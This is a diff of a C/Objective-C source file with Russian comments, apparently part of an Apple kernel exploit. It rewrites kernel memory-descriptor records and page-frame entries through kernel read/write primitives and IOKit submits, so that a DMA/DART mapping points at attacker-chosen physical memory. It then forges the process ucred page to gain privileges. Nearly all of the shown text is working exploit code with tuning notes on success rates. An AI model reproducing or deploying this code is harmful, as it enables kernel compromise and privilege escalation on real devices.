     // Prepare перестраивает sub-MD из родителя — патчим запись арены с нашим
     // backingPA на ctlPA, и драйвер сам построит PTE. Оригинал вернём после execute.
+    uint64_t parHitArr = 0, parHitOld = 0;
+    uint32_t parHitOff = 0;
     kpNote(r, @"  [PH] PAR (parent-ranges) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd202 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
@@ -7168,6 +6939,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // B: [pd+0x90]→+0x10=records→record[0]+0x00 = owner-MD — его ranges держат
     // базу == backingPA; патчим её на ctlPA (plain data, без PAC) → rewriter
     // 0x86eb7cc скопирует в desc+0x9c при execute → DART замапит ctlPA.
+    uint64_t ownHitArr = 0, ownHitOld = 0;
+    uint32_t ownHitOff = 0;
     kpNote(r, @"  [PH] OWN (owner-MD база) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd207 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
@@ -7235,6 +7008,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // rewriter'а). Путь: [surf+0x30] plane sub-MD → [+0x60] родитель (root MD) →
     // его указатели/массивы → запись == backingPA>>14 → ctlPFN. Без frame-type
     // лотереи — прямо по цепочке объектов.
+    uint64_t rmdHitArr = 0, rmdHitOld = 0;
+    uint32_t rmdHitOff = 0;
     kpNote(r, @"  [PH] RMD (root-MD page-list) — старт");   // 1.9.244 крошка фаз
     {
         uint64_t pd211 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
@@ -7277,11 +7052,6 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             if (!rmdHitArr) kpNote(r, @"  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора");
         }
     }
-    // 1.9.262 fast-path: сюда прыгаем из CHAIN при nDep>0 — пропускаем ТОЛЬКО
-    // диагностические фазы (EARLY/DEP/VAD/PAR/OWN/RMD); svc/victim/tsdV/victim#1
-    // идут штатно ниже. (Метка БЫЛА перед tsdV — victim открывался в спане,
-    // kr=0x10000003 на retry, 262b.)
-kpx_submit1: ;
     // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
     //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
     //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
@@ -7341,88 +7111,14 @@ kpx_submit1: ;
     *(uint32_t *)(tsdV + 0) = srcID;
     *(uint32_t *)(tsdV + 4) = dstID;
     *(uint64_t *)(tsdV + 8) = 1;   // async
-    // 1.9.271 (р.68): и перед victim#1 — bit1=0 + buf+0x10=0 последними записями,
-    // иначе op-4 отдаёт stale-сегменты (оригинальные PA) мимо отравленных entries.
-    if (allBuf) {
-        uint64_t fl = early_kread64(allBuf + 0x28);
-        uint8_t fb = 0; kreadbuf(allBuf + 0x2d, &fb, 1);
-        uint64_t s10 = early_kread64(allBuf + 0x10);
-        if ((fb & 0x02) || s10) {
-            early_kwrite64(allBuf + 0x10, 0);
-            early_kwrite64(allBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fb & ~0x02) << 40));
-        }
-    }
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
-    // 1.9.263: OPD-пробник+патч на fast-path — в проигрышных бутах (258/259/262c)
-    // сериализатор не читал наши источники вообще. Читаем op-дескриптор (р.57:
-    // op → [op+0x438]+0x98 cmd → [cmd+0x48] desc): его тип-ниббл (р.65 L3), гейты
-    // [op+0xc04]/[cmd+0x68] (р.65 L1/L2) и его СОБСТВЕННЫЙ record buffer — если это
-    // снапшот-копия с оригинальным pfn (создана до нашего патча), патчим и его.
-    if (nDep) {
-        uint64_t vcO = kpM2TClientVA(r, isTable, victim, @"opc263-victim");
-        uint64_t ucO = kpLooksLikeKernelPointer(vcO) ? kp_untag_ptr(early_kread64(vcO + 0x30)) : 0;
-        uint64_t provO = kpLooksLikeKernelPointer(ucO) ? kp_untag_ptr(early_kread64(ucO + 0xe8)) : 0;
-        uint64_t opVA = 0;
-        if (kpLooksLikeKernelPointer(provO) && kpSafeToRead(provO)) {
-            uint64_t arrays[2] = { kp_untag_ptr(early_kread64(provO + 0xc8)), kp_untag_ptr(early_kread64(provO + 0x110)) };
-            uint64_t counts[2] = { early_kread64(provO + 0xb8), early_kread64(provO + 0x100) };
-            for (int ai = 0; ai < 2 && !opVA; ai++) {
-                uint64_t arr = arrays[ai];
-                uint64_t cnt = counts[ai]; if (cnt > 256) cnt = 256;
-                if (!kpLooksLikeKernelPointer(arr)) continue;
-                for (uint64_t i = 0; i < cnt && !opVA; i++) {
-                    uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
-                    if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
-                    if (kp_untag_ptr(early_kread64(op + 0x48)) == ucO) { opVA = op; break; }
-                }
-            }
-        }
-        if (opVA) {
-            uint64_t c04 = early_kread64(opVA + 0xc04);
-            uint64_t ps = kp_untag_ptr(early_kread64(opVA + 0x438));
-            if (!kpLooksLikeKernelPointer(ps)) ps = kp_untag_ptr(early_kread64(opVA + 0x6f8));
-            uint64_t cmd = kpLooksLikeKernelPointer(ps) ? kp_untag_ptr(early_kread64(ps + 0x98)) : 0;
-            uint64_t c68 = (kpLooksLikeKernelPointer(cmd) && kpSafeToRead(cmd)) ? early_kread64(cmd + 0x68) : 0;
-            uint64_t desc = (kpLooksLikeKernelPointer(cmd) && kpSafeToRead(cmd)) ? kp_untag_ptr(early_kread64(cmd + 0x48)) : 0;
-            uint64_t dtyp = (kpLooksLikeKernelPointer(desc) && kpSafeToRead(desc)) ? (early_kread64(desc + 0x20) & 0xf0) : 0xff;
-            uint64_t hdr2 = kpLooksLikeKernelPointer(desc) ? kp_untag_ptr(early_kread64(desc + 0x90)) : 0;
-            uint64_t buf2 = kpLooksLikeKernelPointer(hdr2) ? kp_untag_ptr(early_kread64(hdr2 + 0x10)) : 0;
-            uint64_t e2 = kpLooksLikeKernelPointer(buf2) ? early_kread64(buf2 + 0x30) : 0;
-            uint64_t rng2 = kpLooksLikeKernelPointer(desc) ? kp_untag_ptr(early_kread64(desc + 0x60)) : 0;
-            uint64_t ra2 = kpLooksLikeKernelPointer(rng2) ? early_kread64(rng2 + 0x00) : 0;
-            kpNote(r, [NSString stringWithFormat:@"  [OPD] op=%#llx gate=%#llx cmdCache=%#llx desc=%#llx type=%#llx opbuf=%#llx entry0=%#018llx ranges[0]=%#018llx",
-                      (unsigned long long)opVA, (unsigned long long)c04, (unsigned long long)c68,
-                      (unsigned long long)desc, (unsigned long long)dtyp, (unsigned long long)buf2,
-                      (unsigned long long)e2, (unsigned long long)ra2]);
-            // op-desc record buffer — снапшот с оригинальным pfn? патчим и его
-            if (kpLooksLikeKernelPointer(buf2) && (uint32_t)e2 == pfn32 &&
-                ((uint32_t)(e2 >> 32) == 0 || (uint32_t)(e2 >> 32) == 4) && nDep < 24) {
-                usleep(1500);
-                early_kwrite64(buf2 + 0x30, (e2 & 0xffffffff00000000ULL) | ctlPFN);
-                uint64_t rb = early_kread64(buf2 + 0x30);
-                kpNote(r, [NSString stringWithFormat:@"  [OPD] ★ op-desc buf entry0 → ctlPFN: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
-                hitAddr[nDep] = buf2 + 0x30; hitOld[nDep] = e2; hitForm[nDep] = 5; nDep++;
-            }
-            // type-0x20 op-desc → ranges[0].addr = ctlPA (р.65 Q3)
-            if (dtyp == 0x20 && kpLooksLikeKernelPointer(rng2) && nDep < 24) {
-                usleep(1500);
-                early_kwrite64(rng2 + 0x00, ctlPA);
-                uint64_t rb = early_kread64(rng2 + 0x00);
-                kpNote(r, [NSString stringWithFormat:@"  [OPD] ★ op-desc ranges[0].addr → ctlPA: %#018llx — %@", (unsigned long long)rb, rb == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
-                hitAddr[nDep] = rng2; hitOld[nDep] = ra2; hitForm[nDep] = 6; nDep++;
-            }
-        } else {
-            kpNote(r, [NSString stringWithFormat:@"  [OPD] op-entry не найден (UC=%#llx prov=%#llx)", (unsigned long long)ucO, (unsigned long long)provO]);
-        }
-        // 1.9.270: goto kpx_retry УБРАН — fast-path регрессия (0/6 против ~75%
-        // медленного): середина с дозреванием record buffer нужна для победы.
-    }
     // 1.9.222: SPEC-яд — голый pfn32 по +0x58 = ranges-spec rewriter'а (р.52/55:
     // ldr w8,[x22,#0x58] → desc+0x9c). ПРЯМОЙ ПУТЬ (р.55): spec = [planeDesc+0x60],
     // заполняется РАЗ при create, per-execute лишь перечитывается — патч стабилен.
     // Все откаты: rewriter брал pfn из нетронутого spec+0x58. Выигрыш 1.9.207 — он.
-    // 1.9.262: specVA/specOld/nSpec хоиснуты в fast-path блок (там же changed).
+    uint64_t specVA[8], specOld[8];
+    int nSpec = 0;
     {
         uint64_t pdS = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
         uint64_t specS = (kpLooksLikeKernelPointer(pdS) && kpSafeToRead(pdS)) ? kp_untag_ptr(early_kread64(pdS + 0x60)) : 0;
@@ -7848,7 +7544,7 @@ kpx_submit1: ;
     }
     kpNote(r, @"  жду execute victim-опа (backlog ~800 async)…");
     usleep(400000);   // backlog drains → victim executes → DMA
-    changed = 0;   // 1.9.262: объявление хоиснуто в fast-path блок (6722)
+    int changed = 0;
     for (uint32_t i = 0; i < 0x4000; i += 4) {
         uint32_t px = *(volatile uint32_t *)(ctl + i);
         if (px != 0xCCCCCCCC && px != 0) { changed++; if (changed <= 4) kpNote(r, [NSString stringWithFormat:@"    ctl+%#x: %#010x", i, px]); }
@@ -8027,38 +7723,7 @@ kpx_submit1: ;
     // 1.9.219: retry ×3 (было 8 — меньше окно яда и нагрузка на мину); форма4 из
     // массива уже нет; DEP-хиты восстанавливаем после КАЖДОЙ попытки (яд живёт
     // только в окне execute, не секундами — урок prev-12).
-kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо в retry
     for (int attempt = 1; !changed && attempt < 4; attempt++) {
-        // 1.9.266 (р.66): L5 — буфер мог быть перевыделён на прошлом submit
-        // (перечитываем [hdr+0x10]; переехал → свежие оригиналы с нового VA);
-        // L6 — патчим ВСЕ записи на каждой попытке (сериализатор их перечитывает).
-        // 1.9.269 (р.67): конвергенция на уровне PD — [surf+0x30] подменяется
-        // между патчем и submit (MD maintenance per-plane) → наш буфер сирота.
-        // Перечитываем pd каждую попытку; сменился → полная перерезолвка.
-        if (allBuf && pd247) {
-            uint64_t curPd = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
-            if (curPd && curPd != pd247) {
-                pd247 = curPd;
-                hdr247 = kp_untag_ptr(early_kread64(pd247 + 0x90));
-                uint64_t nb = hdr247 ? kp_untag_ptr(early_kread64(hdr247 + 0x10)) : 0;
-                uint32_t nc = nb ? (uint32_t)early_kread64(nb + 0x28) : 0;
-                if (nb && nc && nc <= 64) {
-                    for (uint32_t i = 0; i < nc; i++) allOld[i] = early_kread64(nb + 0x30 + (uint64_t)i * 8);
-                    allCnt = nc; allBuf = nb;
-                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] р.67: pd ПОДМЕНЁН → %#llx, новый буфер %#llx (%u записей) — перепатчено",
-                              (unsigned long long)curPd, (unsigned long long)nb, nc]);
-                }
-            } else if (curPd == pd247) {
-                uint64_t curBuf = kp_untag_ptr(early_kread64(hdr247 + 0x10));
-                if (curBuf && curBuf != allBuf) {
-                    for (uint32_t i = 0; i < allCnt; i++) allOld[i] = early_kread64(curBuf + 0x30 + (uint64_t)i * 8);
-                    allBuf = curBuf;
-                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] L5: record buffer перевыделен → %#llx — перепатчены все записи", (unsigned long long)curBuf]);
-                }
-            }
-            for (uint32_t i = 0; i < allCnt; i++)
-                early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | ctlPFN);
-        }
         for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
         for (int k = 0; k < nSpec; k++) {
             uint64_t cur = early_kread64(specVA[k]);
@@ -8070,24 +7735,8 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
                         : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
                         : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
-                        : (hitForm[i] == 6) ? ctlPA
-                        : (hitForm[i] == 7) ? (gPrimitives.phystokv ? gPrimitives.phystokv(ctlPA) : 0)
                         : (uint64_t)ctlPFN;
             early_kwrite64(hitAddr[i], nq);
-        }
-        // 1.9.271 (р.68): РЕШАЮЩЕЕ — bit1(+0x2d) и stale-сегменты [buf+0x10] в момент
-        // SUBMIT, не патча: промежуточная сериализация до нашего submit выставляет
-        // bit1 и собирает сегменты из ОРИГИНАЛЬНЫХ записей → op-4 отдаёт buffer+0x10
-        // мимо наших отравленных entries (провалившие буты, 25%). Зануляем оба
-        // ПОСЛЕДНИМИ записями перед КАЖДЫМ submit → сериализатор идёт по entries.
-        if (allBuf) {
-            uint64_t fl = early_kread64(allBuf + 0x28);
-            uint8_t fb = 0; kreadbuf(allBuf + 0x2d, &fb, 1);
-            uint64_t s10 = early_kread64(allBuf + 0x10);
-            if ((fb & 0x02) || s10) {
-                early_kwrite64(allBuf + 0x10, 0);
-                early_kwrite64(allBuf + 0x28, (fl & ~(0xffULL << 40)) | ((uint64_t)(fb & ~0x02) << 40));
-            }
         }
         kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
         usleep(400000);
@@ -8103,11 +7752,10 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
         // глубже — wire-layer); entry0 == ctlPFN = mapper игнорирует буфер (H2).
         // 1.9.250 (р.62): bit1 SET = stale-ветка (entries не читаются), bit1
         // CLEAR = сериализатор читает entries. Откат = пересборка из wire list.
-        if (buf247 || allBuf) {
-            uint64_t dBuf = allBuf ? allBuf : buf247;   // 1.9.266: после L5-realloc дампим АКТУАЛЬНЫЙ буфер
-            uint8_t f2 = 0; kreadbuf(dBuf + 0x2d, &f2, 1);
-            uint64_t e0 = early_kread64(dBuf + 0x30);
-            uint64_t e1 = early_kread64(dBuf + 0x38);
+        if (buf247) {
+            uint8_t f2 = 0; kreadbuf(buf247 + 0x2d, &f2, 1);
+            uint64_t e0 = early_kread64(buf247 + 0x30);
+            uint64_t e1 = early_kread64(buf247 + 0x38);
             kpNote(r, [NSString stringWithFormat:@"      buffer пост-submit: flags=%#x entry0=%#018llx entry1=%#018llx — %@",
                       f2, (unsigned long long)e0, (unsigned long long)e1,
                       changed ? @"ЗАПИСЬ ПРОШЛА — сериализатор прочитал яд ✓ (р.62 подтверждён на железе)" :
@@ -8118,7 +7766,6 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
             for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
             for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
             for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
-            if (allBuf && allCnt) for (uint32_t i = 0; i < allCnt; i++) early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, allOld[i]);   // 1.9.266
         }
     }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
@@ -8126,8 +7773,6 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
         early_kwrite64(slotVAs[j], origQs[j]);
     // 1.9.219: финальный restore DEP-хитов ВСЕГДА (яд не живёт дольше теста)
     for (int i = 0; i < nDep; i++) if (hitForm[i] > 0 && hitForm[i] != 4) early_kwrite64(hitAddr[i], hitOld[i]);
-    // 1.9.266: финальный restore ВСЕХ записей record buffer (L6-яд)
-    if (allBuf && allCnt) for (uint32_t i = 0; i < allCnt; i++) early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, allOld[i]);
     // 1.9.222: финальный restore spec (яд не живёт дольше теста)
     if (!changed) for (int k = 0; k < nSpec; k++) if (specOld[k]) early_kwrite64(specVA[k], specOld[k]);
     // 1.9.248: финальный restore records-built flags (кворд +0x28 целиком — count не тронут)
@@ -8182,27 +7827,22 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                 // 1.9.251 (р.63): walker ветки VM/RO охраняется deadly-таблицами
                 // (census 0x15) → pagePA=0. Fallback — PAPT/арена ядра (kpZoneVtoP).
                 if (!pagePA) pagePA = kpZoneVtoP(pageVA);
-                // 1.9.268 (р.67): ucredPA из L3 через DART-чтение (материализованная
-                // пара + все записи отравлены), потом physwrite КОНТЕНТА ucred-страницы
-                // по PA — трансляция не тронута, TLB не нужен (стена 261/262-й).
-                // L3-инжекция убрана.
+                // 1.9.252: walker встал на deadly-таблице (errno 1042) — читаем её
+                // через DART-копию (kpPhysRead16K), leaf PTE сама отдаёт ucredPA.
                 if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && svc) {
                     uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
                     uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
                     uint8_t timg[0x4000];
-                    uint32_t boff = tidx * 8;
-                    uint32_t rx = (boff % 0x4000) / 4, ry = boff / 0x4000;
-                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread L3[%u] rect {%u,%u,2,1}",
-                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte, tidx, rx, ry]);
-                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, rx, ry, 2, 1, timg, r)) {
-                        uint64_t pte = 0; memcpy(&pte, timg, 8);
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
+                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, timg, r)) {
+                        uint64_t pte = 0; memcpy(&pte, timg + (uint64_t)tidx * 8, 8);
                         if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
                             uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
                             uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
-                            uint32_t b3 = l3idx * 8;
                             kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
-                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, (b3 % 0x4000) / 4, b3 / 0x4000, 2, 1, timg, r)) pte = 0;
-                            else memcpy(&pte, timg, 8);
+                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, timg, r)) pte = 0;
+                            else memcpy(&pte, timg + (uint64_t)l3idx * 8, 8);
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx", pte]);
                         if ((pte & 0x3) == 0x3) pagePA = pte & 0x0000ffffffffc000ULL;
@@ -8219,7 +7859,7 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                 // страницы сам охраняется (pkva=0 или q0a не сошёлся).
                 if (!paOK && pagePA && svc) {
                     uint8_t cimg[0x4000];
-                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, pagePA, 0, 0, 64, 64, cimg, r)) {
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, pagePA, cimg, r)) {
                         uint64_t q0c = 0; memcpy(&q0c, cimg, 8);
                         uint32_t uidViaC = 0; memcpy(&uidViaC, cimg + uoff + 0x18, 4);
                         if (q0c == q0b && uidViaC == (uint32_t)getuid()) {
@@ -8265,18 +7905,14 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                                     : (hitForm[i] == 3) ? (((uint64_t)fPFN << 32) | (hitOld[i] & 0xffffffffULL))
                                     : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
                                     : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
-                                    : (hitForm[i] == 6) ? pagePA
-                                    : (hitForm[i] == 7) ? (gPrimitives.phystokv ? gPrimitives.phystokv(pagePA) : 0)
                                     : (uint64_t)fPFN;
                         early_kwrite64(hitAddr[i], nq);
                     }
                     if (nDep) kpNote(r, [NSString stringWithFormat:@"  [FORGE] DEP-хиты перепатчены на ucredPFN (%d шт)", nDep]);
-                    // 1.9.266: и ВСЕ записи record buffer — на ucredPFN (L6)
-                    if (allBuf && allCnt) for (uint32_t i = 0; i < allCnt; i++) early_kwrite64(allBuf + 0x30 + (uint64_t)i * 8, (allOld[i] & 0xffffffff00000000ULL) | fPFN);
                     // victim#2 submit (bit43=0 — свежий rebuild из отравленного источника)
                     // 1.9.251: rect 64×64×4 = 0x4000 — форж покрывает всю 16KB-страницу ucred
-                    // 1.9.259: на СВЕЖЕМ pipe — dst пересериализуется с ucredPFN
-                    // (персистентный кэш старого pipe держит ctlPA, р.65 L1/L2).
+                    // 1.9.272: на СВЕЖЕМ pipe — dst пересериализуется с ucredPFN
+                    // (персистентный кэш главного pipe держит ctlPA от victim#1).
                     uint8_t tsdF[0x1B0];
                     memcpy(tsdF, tsdV, sizeof(tsdF));
                     *(uint32_t *)(tsdF + 0) = srcID;
@@ -8293,7 +7929,8 @@ kpx_retry: ;   // 1.9.262 fast-path: из victim#1 при nDep>0 — прямо 
                         usleep(400000);
                         IOServiceClose(v3);
                     } else {
-                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] fresh pipe#2: open kr=0x%x — victim#2 не было", ok3]);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] fresh pipe#2: open kr=0x%x — fallback на главный", ok3]);
+                        fkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
                         usleep(400000);
                     }
                     uid_t gu = getuid(); gid_t gg = getgid();
